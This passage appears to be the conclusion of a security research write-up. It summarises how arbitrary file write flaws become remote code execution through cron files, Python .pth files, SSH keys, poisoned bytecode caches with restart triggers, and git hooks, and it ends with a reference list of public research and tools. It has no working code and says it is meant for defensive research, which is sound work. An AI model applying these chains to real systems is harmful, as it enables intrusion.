**1. The filesystem IS the execution model.** Modern operating systems, web servers, and language runtimes treat the filesystem as a trusted configuration and code delivery mechanism. Cron reads files from `/etc/cron.d/` and executes them. Python imports whatever `.so` file it finds first. Systemd loads any `.service` file in its unit path. This implicit trust in filesystem contents means that any write primitive — no matter how constrained — is a potential RCE primitive if the attacker can identify an appropriate target.

**2. "Dirty" writes are often sufficient.** Many execution targets tolerate surrounding garbage data. Cron skips malformed lines. SSH `authorized_keys` ignores invalid entries. Shell profiles execute valid commands and error on invalid ones but continue. uWSGI scans entire files for `[uwsgi]` sections. Python `.pth` files need only one valid `import` line. This means even AFW vulnerabilities that prepend/append to existing files — or that mix attacker content with binary data — can achieve RCE.

**3. Restart triggers compound the threat.** The most constrained AFW scenarios (e.g., Docker containers with limited writable directories) are overcome by combining a cached execution target (Bootsnap, opcache, `__pycache__`) with a restart trigger (Puma's `tmp/restart.txt`, Gunicorn worker crash, Werkzeug reloader). The attacker writes the poisoned cache, then writes a second file to trigger process restart, causing the runtime to load the malicious cached code.

**4. The write-to-execution gap is narrowing.** Historical AFW→RCE chains required a separate event (reboot, cron cycle, user login). Modern research has progressively closed this gap: uWSGI `py-auto-reload` fires within seconds, Werkzeug reloaders trigger on any `.py` change, and `/proc/self/mem` provides *immediate* in-process code execution. The trend is toward zero-gap AFW→RCE primitives.

**5. Platform convergence creates universal chains.** Language runtimes (Python, Ruby, Node.js, PHP) provide cross-platform AFW→RCE primitives that work identically on Linux, Windows, macOS, and within containers. A `.pth` file injection works on any platform with Python installed. Git hook poisoning works everywhere Git runs. This makes AFW→RCE chains increasingly platform-independent.

---

## Reference

- Jorian Woltjer, "Arbitrary File Write," *Practical CTF*, https://book.jorianwoltjer.com/web/server-side/arbitrary-file-write
- Doyensec, "A New Vector For 'Dirty' Arbitrary File Write to RCE," 2023, https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html
- siunam, "Python Dirty Arbitrary File Write to RCE via Writing Shared Object Files Or Overwriting Bytecode Files," 2024, https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/
- Conviso AppSec, "From Arbitrary File Write to RCE in Restricted Rails Apps," 2024, https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/
- Datadog Security Labs, "CVE-2025-48384: Git vulnerable to arbitrary file write," 2025, https://securitylabs.datadoghq.com/articles/git-arbitrary-file-write/
- CNCF, "runc container breakout vulnerabilities: A technical overview," 2025, https://www.cncf.io/blog/2025/11/28/runc-container-breakout-vulnerabilities-a-technical-overview/
- SpecterOps, "Revisiting COM Hijacking," 2025, https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/
- VirusTotal, "COM Objects Hijacking," 2024, https://blog.virustotal.com/2024/03/com-objects-hijacking.html
- Palo Alto Networks, "Gaining Persistency on Vulnerable Lambdas," 2024, https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/
- Mandiant/Google, "Deleting Your Way Into SYSTEM: Why Arbitrary File Deletion Vulnerabilities Matter," https://cloud.google.com/blog/topics/threat-intelligence/arbitrary-file-deletion-vulnerabilities/
- MatteoLupinacci, "python_dirty_arbitrary_file_write" (tool), https://github.com/MatteoLupinacci/python_dirty_arbitrary_file_write
- Convisolabs, "rails_arb_file_write_bootsnap" (tool), https://github.com/convisolabs/rails_arb_file_write_bootsnap
- OffSec, "CVE-2024-46986 – Arbitrary File Write in Camaleon CMS Leading to RCE," https://www.offsec.com/blog/cve-2024-46986/
- Bishop Fox, "Poisoned Pipeline Execution Attacks," https://bishopfox.com/blog/poisoned-pipeline-attack-execution-a-look-at-ci-cd-environments
- MITRE ATT&CK, "Poisoned Pipeline Execution, T1677," https://attack.mitre.org/techniques/T1677/

---

*This document was created for defensive security research and vulnerability understanding purposes.*
